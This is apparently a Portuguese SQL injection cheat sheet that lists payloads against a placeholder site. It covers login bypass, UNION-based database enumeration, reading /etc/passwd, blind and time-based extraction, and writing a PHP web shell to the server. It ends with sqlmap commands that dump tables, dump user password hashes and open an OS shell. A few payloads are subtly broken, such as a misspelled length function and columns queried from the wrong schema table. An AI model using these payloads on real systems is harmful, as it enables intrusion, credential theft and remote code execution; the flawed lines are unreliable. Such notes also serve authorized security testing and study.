# SQL Injection (SQLi)

## Bypass Authentication
Uma forma de burlar formulários de login que utilizam requisições SQL é alterar a query criando uma lógica sempre verdadeira e comentando o resto do código. Primeiro envie caracteres especiais como `\` e `'` e analise o comportamento da aplicação. Confirmando a vulnerabilidade de SQLi utilize um payload que será sempre verdadeiro como no exemplo:

`' or 1=1#`

## SQL Error Based

É um SQLi baseado em erro, testamos a aplicação enviando caracteres como `\` ou `'` e recebemos um erro.    

### Descobrindo quantidade de colunas da tabela

Para descobrir a quantidade de colunas na tabela e onde os dados estão sendo retornados na página, utilize `' UNION SELECT 1 %23` e vá incluindo outros valores após o 1 no select, até a consulta retornar os valores utilizados no select refletidos na página.  

`http://www.alvo.com.br/info.php?p=' union select 1,2,3,4,5 %23'`

Outra forma seria utilizando `ORDER BY 1` e tentando ordenar a consulta pelo número da coluna. Vá aumentando o valor de 1 até a aplicação indicar que não existem mais colunas.

`http://www.alvo.com.br/info.php?p=' order by 6 %23'`

### Exploração

Após identificar a quantidade de colunas e quais estão sendo refletidas na página, utilize comandos de SQL no lugar das colunas refletidas para exibir a resposta da consulta.

`http://www.alvo.com.br/info.php?p=' union select 1,2,version(),user(),database() %23'`

### Bypass Addslash

Algumas aplicações podem adicionar uma ``\`` no valor do parâmetro ao tratar as informações, essa função pode acabar quebrando a nossa query. Uma forma de realizar o bypass é enviando o valor do parâmetro em ASCII.

Para converter uma string em ASCII Decimal utilize:
`echo -n "valor" | od -An -tDC`

**Comandos:**  
Retornar o nome de todas as tabelas do information_schema  
`' union select 1,2,table_name,4,5 from information_schema.tables %23'`

Retornar o nome de todas as tabelas de um banco específico  
`' union select 1,2,table_name,4,5 from information_schema.tables where table_schema="nome_banco" %23'`

Retornar o nome de todas as colunas de um banco  
`' union select 1,2,column_name,4,5 from information_schema.tables where table_schema="nome_banco" %23'`

Retornar o nome de todas as colunas de uma tabela  
`' union select 1,2,column_name,4,5 from information_schema.tables where table_schema="nome_banco" and table_name="nome_tabela" %23'`

Retornar valores de uma tabela  
`' union select 1,2,nome_coluna1,nome_coluna2,5 from nome_tabela %23'`
`' union select 1,2,concat(nome_coluna1,':',nome_coluna2),4,5 from nome_tabela %23'`

Ler arquivos do servidor  
`' union select 1,2,load_file("/etc/passwd"),4,5 %23'`

Criar arquivos no servidor  
`' union select 1,2,"<?php system($_GET['p']); ?>",4,5 INTO OUTFILE "/var/www/html/rce.php"%23'`

## Blind SQL Injection

É um SQLi onde a aplicação não retorna os dados da consulta em string (texto), mas sim um valor boleano (Verdadeiro ou Falso). Dessa forma, se quisessemos descobrir o nome do banco de dados teriamos que enviar diversas requisições perguntando se a posição 'x' é igual a letra 'y', por exemplo, a 'primeira' letra da nome do banco é a letra 'A'?. Quando o servidor retornar verdadeiro siginifica que é a letra está correta.  

### Brute force por palavra 

É possível realizar a técnica de brute-force para enumerar nomes de bancos de dados, tabelas e colunas comparando se o nome da base de dados é o nome que inserimos, caso a página retorne verdadeiro encontramos o nome. Utilize os caracteres encodados em ASCII para realizar a comparação, por exemplo:

`login=joao' and database() = char(100,98,109,114,116,117,114)`

### Brute force por caractere 

Essa técnica é mais demorada, pois irá realizar um burte-force por caracteres para descobrir informações do banco de dados.  
O primeiro passo é descobrir a quantidade de caracteres da palavra que está buscando com a condição `lenght(group_concat(table_name)) = 1`. Vá incrementando o valor até a requisição ser verdadeira. 
Após descobrir o tamanho utilize `substring(group_concat(table_name),1,1)` para extrair letra por letra da palavra até o tamanho máximo descoberto anteriormente. Utilize os caracteres encodados em ASCII para realizar a comparação.  

`login=joao' and ascii(substring((select group_concat(table_name) from information_schema.tables where table_schema="nome_banco"),1,1)) = 97 %23'`  

## Time Based SQL Injection

O Time Based SQLi baseado em tempo também retorna um valor boleano assim como o Blind SQLi, mas utiliza o comando `sleep()` para identicar quando uma aplicação está vulnerável ou não. Podemos utiliza a condição `if` para verificar se o que estamos buscando é verdadeiro ou falso.  

`login=joao' or if (ascii(substring(database(),1,1)), sleep(3),0) %23'`  

## Ferramentas

### sqlmap

Analisar um parâmetro
`sqlmap -u "http://www.alvo.com.br/info.php?p=teste"`

Analisar um parâmetros com método POST
`sqlmap -u "http://www.alvo.com.br/info.php?p=teste" --forms`

Extrair nome dos bancos de dados
`sqlmap -u "http://www.alvo.com.br/info.php?p=teste" --dbs`

Extrair nome do banco de dados atual
`sqlmap -u "http://www.alvo.com.br/info.php?p=teste" --current-db`

Extrair nome das tabelas
`sqlmap -u "http://www.alvo.com.br/info.php?p=teste" -D nome_banco --tables`

Extrair nome das colunas
`sqlmap -u "http://www.alvo.com.br/info.php?p=teste" -D nome_banco -T nome_tabela --columns`

Extrais dados das colunas
`sqlmap -u "http://www.alvo.com.br/info.php?p=teste" -D nome_banco -T nome_tabela -C 'coluna1,coluna2' --dump`

Retonar usuário atual do banco
`sqlmap -u "http://www.alvo.com.br/info.php?p=teste" --current-user`

Retornar todos os usuários do banco
`sqlmap -u "http://www.alvo.com.br/info.php?p=teste" --users`

Retorna as credenciais dos usuários do banco
`sqlmap -u "http://www.alvo.com.br/info.php?p=teste" --passwords`

Subir shell em diretório com permissão
`sqlmap -u "http://www.alvo.com.br/info.php?p=teste" --os-shell`

